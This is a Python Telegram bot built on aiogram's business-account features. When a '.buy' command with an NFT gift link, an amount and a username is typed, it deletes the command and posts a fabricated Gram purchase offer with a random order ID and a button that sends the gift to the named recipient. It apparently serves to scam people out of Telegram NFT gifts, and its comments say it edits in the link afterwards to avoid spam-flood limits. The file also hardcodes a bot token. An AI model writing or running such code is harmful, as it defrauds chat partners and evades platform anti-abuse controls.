import asyncio, re, random, string, logging
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions,
)
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8726930734:AAESV0MI_3abx8lJwN9sJLuUfYSkiX_oKwY"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")

# .buy https://t.me/nft/Name-123 сумма [gram] [@recipient]
CMD_RE = re.compile(
    r"^\.buy\s+(https?://t\.me/nft/\S+)\s+(\d+)(?:\s+gram)?(?:\s+@?(\S+))?",
    re.IGNORECASE
)

def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug, num = m.group(1), m.group(2)
    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
    return name, num, slug

def oid():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))

def build_offer_plain(amount, gift_name, gift_num, order_id, recipient):
    return (
        f"Пользователь предлагает вам\n"
        f"<b>{amount:,} 💎 Gram</b> за подарок <b>{gift_name} #{gift_num}</b>.\n\n"
        f"Оффер действителен ещё <b>6 ч.</b>\n\n"
        f"<i>Ордер #{order_id}, получатель @{recipient}</i>"
    )

def build_offer_linked(amount, gift_name, gift_num, order_id, recipient, url):
    return (
        f"Пользователь предлагает вам\n"
        f"<b>{amount:,} 💎 Gram</b> за подарок "
        f"<b><a href=\"{url}\">{gift_name} #{gift_num}</a></b>.\n\n"
        f"Оффер действителен ещё <b>6 ч.</b>\n\n"
        f"<i>Ордер #{order_id}, получатель @{recipient}</i>"
    )

def make_keyboard(recipient):
    return InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(
                text="Передать подарок",
                url=f"tg://send_gift?to={recipient}",
            )
        ]]
    )

@dp.business_message(F.text)
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return

    text = message.text or ""
    m = CMD_RE.match(text.strip())
    if not m:
        return

    link      = m.group(1)
    amount    = int(m.group(2))
    recipient = m.group(3)  # @username из команды

    gift = parse_gift(link)
    if not gift:
        return

    gift_name, gift_num, slug = gift
    nft_url  = f"https://t.me/nft/{slug}-{gift_num}"
    order_id = oid()

    if not recipient:
        logging.warning("recipient не указан в команде")
        return

    recipient = recipient.lstrip("@")

    # Шаг 1: без ссылки — не вызывает PEER_FLOOD
    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=build_offer_plain(amount, gift_name, gift_num, order_id, recipient),
            reply_markup=make_keyboard(recipient),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"send error: {e}")
        return

    # Удаляем .buy команду
    try:
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[message.message_id],
        )
    except Exception as e:
        logging.error(f"del: {e}")

    # Шаг 2: редактируем со ссылкой и превью
    await asyncio.sleep(1.5)

    try:
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=sent.message_id,
            text=build_offer_linked(amount, gift_name, gift_num, order_id, recipient, nft_url),
            reply_markup=make_keyboard(recipient),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=False,
            ),
        )
    except TelegramBadRequest as e:
        logging.error(f"edit error: {e}")

@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "Формат команды:\n"
        "<code>.buy https://t.me/nft/Name-123 сумма @username</code>"
    )

async def main():
    await dp.start_polling(
        bot,
        allowed_updates=[
            "business_connection",
            "business_message",
            "edited_business_message",
            "message",
        ],
    )

if __name__ == "__main__":
    asyncio.run(main())
